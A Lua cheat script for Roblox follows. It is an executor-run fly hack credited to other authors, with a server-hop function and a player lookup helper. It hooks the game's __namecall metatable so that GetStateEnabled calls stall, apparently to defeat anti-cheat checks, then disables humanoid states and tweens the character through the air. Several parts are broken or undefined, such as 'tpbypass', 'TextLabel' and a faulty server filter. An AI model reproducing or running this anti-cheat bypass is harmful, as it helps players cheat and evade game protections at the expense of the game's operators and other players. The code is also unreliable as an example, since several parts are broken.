-- i did not make this fly credits to vx_f for maiking this fly, was supposed to be for rogue lineage but that didnt work out very well so its here now aaaaaaaaaaaa --

local l = game.Players.LocalPlayer
local m = l:GetMouse()
local uis = game.UserInputService
local rs = game.RunService
local states = {Enum.HumanoidStateType.FallingDown,Enum.HumanoidStateType.Running,Enum.HumanoidStateType.RunningNoPhysics,Enum.HumanoidStateType.Climbing,Enum.HumanoidStateType.StrafingNoPhysics,Enum.HumanoidStateType.Ragdoll,Enum.HumanoidStateType.Jumping,Enum.HumanoidStateType.Landed,Enum.HumanoidStateType.Flying,Enum.HumanoidStateType.Freefall,Enum.HumanoidStateType.Seated,Enum.HumanoidStateType.PlatformStanding,Enum.HumanoidStateType.Dead,Enum.HumanoidStateType.Physics}
local meta = getrawmetatable(game)
local namecall = meta.__namecall
make_writeable(meta)
meta.__namecall = newcclosure(function(self,...)
	if not checkcaller() then
		local args = {...}
		if getnamecallmethod() == 'GetStateEnabled' then
			return wait(9e9)
		end
	end
	return namecall(self,...)
end)
flysettings = {
	keybind = Enum.KeyCode.F,
	fly = false,
	speed = 400,
	directions = {w = false, s = false, a = false, d = false}
}

function TweenToPos(pos, speed)
	local a = game.TweenService
	local b =  l.Character.Torso or l.Character.HumanoidRootPart
	local c = TweenInfo.new(1 * math.floor((b.Position - pos).magnitude) / speed, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)  
	a:Create(b, c, {CFrame = CFrame.new(pos)}):Play()
	repeat
		b.Velocity = Vector3.new(0, 0, 0)
	until 1 * math.floor((b.Position - pos).magnitude) / speed
end
function ChangeStates(b)
	pcall(function() -- me when pcall yes
		for i, v in pairs(states) do
			l.Character.Humanoid:SetStateEnabled(v, b)

		end
	end)
end
uis.InputBegan:connect(function(input,chat)
	if chat then
		return
	end
	if input.KeyCode == flysettings.keybind then
		flysettings.fly = not flysettings.fly
	elseif input.KeyCode == Enum.KeyCode.W then
		flysettings.directions.w = true
	elseif input.KeyCode == Enum.KeyCode.S then
		flysettings.directions.s = true
	elseif input.KeyCode == Enum.KeyCode.A then
		flysettings.directions.a = true
	elseif input.KeyCode == Enum.KeyCode.D then
		flysettings.directions.d = true
	end
end)
uis.InputEnded:connect(function(input,chat)
	if chat then
		return
	end
	if input.KeyCode == Enum.KeyCode.W then
		flysettings.directions.w = false
	elseif input.KeyCode == Enum.KeyCode.S then
		flysettings.directions.s = false
	elseif input.KeyCode == Enum.KeyCode.A then
		flysettings.directions.a = false
	elseif input.KeyCode == Enum.KeyCode.D then
		flysettings.directions.d = false
	end
end)
rs.RenderStepped:connect(function()



	if flysettings.fly == true then
		if tpbypass == false then
		else

			ChangeStates(false)
			l.Character.Torso.Velocity = Vector3.new(0, 0, 0)
			if flysettings.directions.w == true then
				TweenToPos(l.Character.Torso.CFrame.p + workspace.CurrentCamera.CoordinateFrame.lookVector * 2.5, flysettings.speed)
			end
			if flysettings.directions.s == true then
				TweenToPos(l.Character.Torso.CFrame.p - workspace.CurrentCamera.CoordinateFrame.lookVector * 2.5, flysettings.speed)
			end
			if flysettings.directions.a == true then
				TweenToPos(l.Character.Torso.CFrame.p - workspace.CurrentCamera.CoordinateFrame.rightVector * 2.5, flysettings.speed)
			end
			if flysettings.directions.d == true then
				TweenToPos(l.Character.Torso.CFrame.p + workspace.CurrentCamera.CoordinateFrame.rightVector * 2.5, flysettings.speed)
			end
		end
	else
		ChangeStates(true)
	end
end)



-- random serverhop thing, credits to chupachups for sending it yes --
function GetServers()
	local a = {}
	local b = game:HttpGet('https://games.roblox.com/v1/games/'..tostring(game.PlaceId)..'/servers/Public?limit=100&sortOrder=Asc')
	local c = game.HttpService:JSONDecode(b)
	for i, v in pairs(c.data) do
		if c.data.playing ~= 8 then
			table.insert(a, v.id)
		end
	end
	return a
end
function HopServer()
	local a = GetServers()
	local b
	repeat b = a[math.random(1, #a)] until b ~= game.JobId
	game.TeleportService:TeleportToPlaceInstance(game.PlaceId, b)
end

-- Scripts:

local function GBVO_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end

	counter = 0

	while wait(0.1)do
		script.Parent.TextColor3 = Color3.fromHSV(zigzag(counter),1,1)

		counter = counter + 0.01
	end
end
coroutine.wrap(GBVO_fake_script)()

function GetPlayer(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i, v in pairs(game.Players:GetPlayers()) do
			table.insert(Found, v)
		end
	elseif strl == "others" then
		for i, v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name then
				table.insert(Found, v)
			end
		end
	else
		for i, v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found, v)
			end
		end
	end
	return Found
end

